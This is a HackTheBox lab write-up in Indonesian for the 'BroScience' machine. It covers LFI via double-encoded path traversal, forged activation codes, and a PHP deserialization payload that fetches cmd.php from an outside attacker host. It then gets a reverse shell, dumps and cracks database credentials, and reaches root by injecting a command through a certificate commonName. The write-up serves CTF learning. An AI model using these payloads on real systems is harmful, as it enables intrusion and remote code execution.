---
title: "HackTheBox - BroScience WriteUps"
date: 2023-1-25 02:00:00 +07:00
categories: [WriteUps]
tags: [ctf, hackthebox, pentest, writeups]
image: 
---

# HackTheBox BroScience WriteUps

Scanning dengan Nmap, dan mendapatkan Port yang terbuka yaitu Port: 22 SSH, 80 HTTP Apache, 443 SSL/HTTP Apache
```
┌──(root㉿yupy)-[~/yp/hackthebox/broscience]
└─# nmap -sC -sV broscience.htb 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 18:38 PST
Nmap scan report for broscience.htb (10.10.11.195)
Host is up (0.084s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-title: Did not follow redirect to https://broscience.htb/
|_http-server-header: Apache/2.4.54 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: BroScience : Home
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.14 seconds
```
Scanning Fuzzing dengan berbagai tools dan mendapatkan directory:
![image](https://media.discordapp.net/attachments/740245586095112242/1067690800697311292/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067690852920610876/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067690867927822346/image.png)

Disini kita mendapatkan IDOR juga pada parameter ``ID`` bila kita menginputkan atau mengganti user 1 menjadi 2 kita disini dapat melihat informasi data user tersebut
![image](https://media.discordapp.net/attachments/740245586095112242/1067691203535056946/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067691222602354698/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067691250460934194/image.png)

Dari scanning Fuzzing Directory tersebut kita mendapatkan Index of Directory Listing.
![image](https://media.discordapp.net/attachments/740245586095112242/1067691575762751488/image.png)

Selanjutnya bila kita membuka file ``img.php`` akan mendapatkan error pada parameter ``path``
![image](https://media.discordapp.net/attachments/740245586095112242/1067692380213497976/image.png)

Kita mencoba mengecek kerentanan LFI, disini kita mendapatkan filter dari website bila payload LFI ini ditolak oleh server
![image](https://media.discordapp.net/attachments/740245586095112242/1067692567631773796/image.png)

Selanjutnya kita mencoba bypass dengan cara URL Encode 2x seperti gambar dibawah:
![image](https://media.discordapp.net/attachments/740245586095112242/1067692895781535784/image.png)

Apabila kita menggunakan payload yang sudah di Encode URL kita akan mendapatkan response ``/etc/passwd`` pada server website
![image](https://media.discordapp.net/attachments/740245586095112242/1067693247796883486/image.png)

Disini kita mengetahui user bill dan isi user yang ada pada ``/etc/passwd``
![image](https://media.discordapp.net/attachments/740245586095112242/1067693712982941726/image.png)

Selanjutnya kita membaca file yang ada didalam directory apache tersebut disini kita membaca isi file ``db_connect.php``
```
../../../../../var/www/html/includes/db_connect.php
```
![image](https://media.discordapp.net/attachments/740245586095112242/1067693875386392596/image.png)

Disini kita membaca file ``utils.php``, file ini terdapat code untuk mengaktifiasi akun
```
../../../../../var/www/html/includes/utils.php
```
![image](https://media.discordapp.net/attachments/740245586095112242/1067694248612335616/image.png)

Selanjutnya kita membaca ``activate.php``
```
../../../../../var/www/html/activate.php
```
![image](https://media.discordapp.net/attachments/740245586095112242/1067694704768069722/image.png)

Apabila kita membuka register.php disini terdapat form register kita mencoba membuat akun pada form register ini
![image](https://media.discordapp.net/attachments/740245586095112242/1067694902164602921/image.png)

Kita akan menggunakan kode yang ditemukan di include/utils.php untuk menghasilkan kode aktivasi untuk pengguna yang kita buat sebelumnya. Sekarang saatnya mengaktifkan akun, menggunakan tanggal waktu yang didapat response
![image](https://media.discordapp.net/attachments/740245586095112242/1067695158411407360/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067695178158198835/image.png)

Selanjutnya kita membuat code php dengan mengambil source code yang didapat dari ``/utils.php``
![image](https://media.discordapp.net/attachments/740245586095112242/1067695390801002516/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067695482241032192/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067695490021466142/image.png)

Berikutnya kita menginputkan code aktivasi pada directory ``/activate.php`` dan menambahkan parameter ``code=``
![image](https://media.discordapp.net/attachments/740245586095112242/1067695740681453619/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067695772566564864/image.png)

Selanjutnya kita membaca file ``utils.php`` yang didapat dari kerentanan LFI
```
../../../../../var/www/html/includes/utils.php
```
![image](https://media.discordapp.net/attachments/740245586095112242/1067696147268915202/image.png)

Disini kita membuat payload yang nanti bisa mengupload file dengan cookie 
```php
<?php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "http://10.10.14.7:1111/cmd.php";
    public $imgPath = "./cmd.php";

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$payload = base64_encode(serialize(new AvatarInterface));
echo $payload;
?>
```
![image](https://media.discordapp.net/attachments/740245586095112242/1067696377859158026/image.png)

Setelah menjalankan code payload tersebut kita akan mendapatkan code untuk upload file keserver
![image](https://media.discordapp.net/attachments/740245586095112242/1067696555714424882/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067696569958285322/image.png)

Untuk payload kita menggunakan payload dibawah dengan cara reverse shell
![image](https://media.discordapp.net/attachments/740245586095112242/1067696776779415562/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067696787156111410/image.png)

Selanjutnya kita akan Privileges Escalation pada file ``db_connetct.php`` yang mendapatkan informasi sensitive disini dijalankan dengan psql secara langsung.
![image](https://media.discordapp.net/attachments/740245586095112242/1067696995764027495/image.png)

Kita menjalankan psql dan dengan payload dibawah dan untuk membaca isi psql tersebut kita menggunakan command seperti Mysql, dengan menginputkan ``select username, password from users;``
![image](https://media.discordapp.net/attachments/740245586095112242/1067697344939839528/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067697363302486106/image.png)

Setelah user dan password didapat kita akan crack password tersebut dengan command dibawah
![image](https://media.discordapp.net/attachments/740245586095112242/1067697594677076049/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067697619150848100/image.png)

Disini kita mencoba login pada SSH dengan user dan password didapat tadi.
![image](https://media.discordapp.net/attachments/740245586095112242/1067697816685789204/image.png)

Setelah mencari cari yang ada di dalam SSH ini kita mendapatkan file renew_cert.sh. Skrip ini adalah skrip bash yang memeriksa kedaluwarsa file sertifikat SSL yang diberikan, dan jika hampir kedaluwarsa, ia akan mencetak informasi tentang sertifikat seperti negara, negara bagian, organisasi, dan nama umum. Skrip mengambil satu argumen, nama file sertifikat, dan menggunakan perintah openssl untuk memeriksa tanggal kedaluwarsa sertifikat dan mengekstrak informasi dari sertifikat. Skrip akan keluar dengan kode status 0 jika sertifikat belum perlu diperpanjang, dan 1 jika sertifikat hampir kedaluwarsa. 
```bash
-bash-5.1$ cat /opt/renew_cert.sh
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
```

Jadi jika kita membuat sertifikat yang akan segera kedaluwarsa, root akan menghasilkan yang baru dan kita dapat melihat nama sertifikat tersebut adalah apa pun yang kita masukkan ke dalam variabel ``$commonname``.
Jadi mari buat sertifikat baru yang akan berisi kode berbahaya dengan nama umum sehingga root akan menjalankannya.
Anda dapat menggunakan tautan ini untuk membaca cara membuat sertifikat yang ditandatangani sendiri.

```
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1
```
![image](https://media.discordapp.net/attachments/740245586095112242/1067698467843080234/image.png)

Selanjutnya kita mengecek apakah ``/bin/bash`` sudah berubah permissionnya dan kita berhasil mendapatkan root access
![image](https://media.discordapp.net/attachments/740245586095112242/1067698705597218897/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1067698720390533190/image.png?width=659&height=607)
